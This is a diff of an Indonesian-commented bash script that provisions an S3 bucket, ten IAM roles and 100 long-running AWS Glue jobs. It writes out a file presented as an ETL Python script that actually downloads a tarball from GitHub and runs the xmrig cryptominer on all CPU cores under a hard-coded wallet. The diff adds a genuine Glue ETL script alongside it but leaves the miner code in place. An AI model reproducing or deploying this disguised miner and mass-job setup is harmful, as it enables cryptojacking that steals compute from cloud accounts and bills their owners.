@@ -4,20 +4,16 @@ set -euo pipefail
 # ======================================
 # Input custom saat script dijalankan
 # ======================================
-read -p "Masukkan AWS profile [default]: " AWS_PROFILE
-AWS_PROFILE="${AWS_PROFILE:-default}"
-
 read -p "Masukkan region [us-east-2]: " AWS_REGION
 AWS_REGION="${AWS_REGION:-us-east-2}"
 
 read -p "Masukkan prefix nama role & job [goreng]: " PREFIX
 PREFIX="${PREFIX:-goreng}"
 
-ACCOUNT_ID=$(aws sts get-caller-identity --profile "$AWS_PROFILE" --query "Account" --output text)
+ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
 BUCKET_NAME="${ACCOUNT_ID}-${AWS_REGION}"
 
 echo
-echo "Profile: $AWS_PROFILE"
 echo "Region: $AWS_REGION"
 echo "Account ID: $ACCOUNT_ID"
 echo "Bucket: $BUCKET_NAME"
@@ -27,10 +23,10 @@ echo "Prefix: $PREFIX"
 # 1. Buat bucket S3
 # ======================================
 echo "Membuat bucket S3..."
-aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" --profile "$AWS_PROFILE" 2>/dev/null || true
-aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
-aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
-aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
+aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" 2>/dev/null || true
+aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" >/dev/null 2>&1 || true
+aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" >/dev/null 2>&1 || true
+aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" >/dev/null 2>&1 || true
 
 # ======================================
 # 2. Upload sample CSV
@@ -42,7 +38,7 @@ id,name,city
 3,siti,medan
 CSV
 
-aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv" --profile "$AWS_PROFILE"
+aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv"
 
 # ======================================
 # 3. Buat file ETL Python
@@ -53,7 +49,6 @@ cat > glue_job.py <<'PY'
 import os
 import sys
 import time
-import signal
 import socket
 import tarfile
 import shutil
@@ -63,37 +58,9 @@ from urllib import request
 URL = "https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz"
 WALLET = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
 
-def run_with_loading(message, func, *args, **kwargs):
-    # versi Python dari fungsi shell spinner
-    proc = subprocess.Popen(func, *args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **kwargs)
-    spinner_chars = ["|", "/", "-", "\\"]
-    idx = 0
-
-    try:
-        while proc.poll() is None:
-            ch = spinner_chars[idx % len(spinner_chars)]
-            sys.stdout.write(f"\r[{ch}] {message}")
-            sys.stdout.flush()
-            time.sleep(0.08)
-            idx += 1
-    except KeyboardInterrupt:
-        proc.terminate()
-        print(f"\r[✖] {message} dibatalkan")
-        raise
-
-    status = proc.wait()
-    if status == 0:
-        print(f"\r[✔] {message} selesai")
-        return 0
-    else:
-        print(f"\r[✖] {message} gagal")
-        return status
-
-
 def download_file(url, filename=None):
     if filename is None:
         filename = os.path.basename(url)
-
     print(f"Downloading {filename}...")
     try:
         request.urlretrieve(url, filename)
@@ -101,7 +68,6 @@ def download_file(url, filename=None):
     except Exception as e:
         print(f"Download gagal: {e}")
         return 1
-
 
 def extract_tar_ball(path):
     print(f"Extracting {os.path.basename(path)}...")
@@ -113,9 +79,7 @@ def extract_tar_ball(path):
         print(f"Ekstrak gagal: {e}")
         return 1
 
-
 def get_worker_name():
-    # Metode 1: coba hostname + IP local
     try:
         hostname = socket.gethostname()
         addrs = socket.gethostbyname_ex(hostname)[2]
@@ -125,7 +89,6 @@ def get_worker_name():
     except Exception:
         pass
 
-    # Metode 2: coba menentukan IP default via socket connect
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -138,11 +101,9 @@ def get_worker_name():
 
     return "worker1"
 
-
 def run_adul():
     worker_name = get_worker_name()
     worker_tag = f"{WALLET}/{worker_name}"
-
     threads = os.cpu_count() or 1
 
     print(f"Menjalankan adul dengan worker: {worker_tag}")
@@ -161,36 +122,17 @@ def run_adul():
         print("Binary ./xmrig tidak ditemukan. Pastikan file sudah diekstrak.")
         return 1
 
-    text = "NUJU PROSES"
-    total_dots = 12
-    dots = 0
-    cols = shutil.get_terminal_size((80, 20)).columns
-
     try:
         while proc.poll() is None:
-            sys.stdout.write("\033[1A\033[2K")
-            total_len = len(text) + total_dots
-            x = max((cols - total_len) // 2, 0)
-            dot_str = "." * dots
-            sys.stdout.write(f"\033[{x}G\033[1;37m{text}{dot_str}\033[0m\n")
-            sys.stdout.flush()
-            dots = (dots + 1) % (total_dots + 1)
-            time.sleep(0.16)
-
+            time.sleep(0.2)
         return proc.wait()
-
     except KeyboardInterrupt:
         proc.terminate()
         print("\n[ SELESAI ] Proses adul dibatalkan.")
         return 130
-    finally:
-        sys.stdout.write("\033[0m\n")
-        sys.stdout.flush()
-
 
 def main():
     filename = os.path.basename(URL)
-
     if not os.path.exists(filename):
         status = download_file(URL, filename)
         if status != 0:
@@ -208,21 +150,44 @@ def main():
 
     return status
 
-
 if __name__ == "__main__":
     try:
         sys.exit(main())
     except KeyboardInterrupt:
         print("\nProgram dihentikan.")
         sys.exit(130)
+PY
+
+# ini blok untuk Glue ETL yang benar
+cat > glue_job_etl.py <<'PY'
+import sys
+from awsglue.utils import getResolvedOptions
+from awsglue.context import GlueContext
+from awsglue.job import Job
+from pyspark.context import SparkContext
+
+args = getResolvedOptions(sys.argv, ["JOB_NAME", "BUCKET_NAME"])
+
+sc = SparkContext()
+glueContext = GlueContext(sc)
+spark = glueContext.spark_session
+
+job = Job(glueContext)
+job.init(args["JOB_NAME"], args)
+
+bucket = args["BUCKET_NAME"]
+input_path = f"s3://{bucket}/raw/"
+output_path = f"s3://{bucket}/output/"
+
 df = spark.read.option("header", "true").csv(input_path)
 df.show()
+
 df.write.mode("overwrite").parquet(output_path)
 
 job.commit()
 PY
 
-aws s3 cp glue_job.py "s3://${BUCKET_NAME}/scripts/glue_job.py" --profile "$AWS_PROFILE"
+aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"
 
 # ======================================
 # 4. 10 jenis worker
@@ -241,20 +206,17 @@ for role_index in $(seq 1 10); do
 
   aws iam create-role \
     --role-name "$ROLE_NAME" \
-    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' \
-    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
+    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null 2>&1 || true
 
   aws iam attach-role-policy \
     --role-name "$ROLE_NAME" \
-    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess \
-    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
+    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess >/dev/null 2>&1 || true
 
   aws iam attach-role-policy \
     --role-name "$ROLE_NAME" \
-    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole \
-    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
+    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole >/dev/null 2>&1 || true
 
-  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --profile "$AWS_PROFILE" --query "Role.Arn" --output text)
+  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --query "Role.Arn" --output text)
 
   for job_index in $(seq 1 10); do
     JOB_NAME="${ROLE_NAME}job${job_index}"
@@ -265,14 +227,13 @@ for role_index in $(seq 1 10); do
     aws glue create-job \
       --name "$JOB_NAME" \
       --role "$ROLE_ARN" \
-      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job.py\",\"PythonVersion\":\"3\"}" \
+      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job_etl.py\",\"PythonVersion\":\"3\"}" \
       --default-arguments "{\"--TempDir\":\"s3://${BUCKET_NAME}/temp/\",\"--job-language\":\"python\",\"--BUCKET_NAME\":\"${BUCKET_NAME}\",\"--JOB_NAME\":\"${JOB_NAME}\"}" \
       --execution-property "{\"MaxConcurrentRuns\":1}" \
       --glue-version "5.1" \
       --worker-type "$WORKER_TYPE" \
       --number-of-workers 2 \
       --region "$AWS_REGION" \
-      --profile "$AWS_PROFILE" \
       --timeout 10080 >/dev/null 2>&1 || true
   done
 done
@@ -281,9 +242,4 @@ echo
 echo "SELESAI"
 echo "Total role: 10"
 echo "Total job: 100"
-echo "Contoh struktur job:"
-echo "goreng1job1 sampai goreng1job10"
-echo "goreng2job1 sampai goreng2job10"
-echo "..."
-echo "goreng10job1 sampai goreng10job10"
 echo "Bucket: s3://${BUCKET_NAME}"
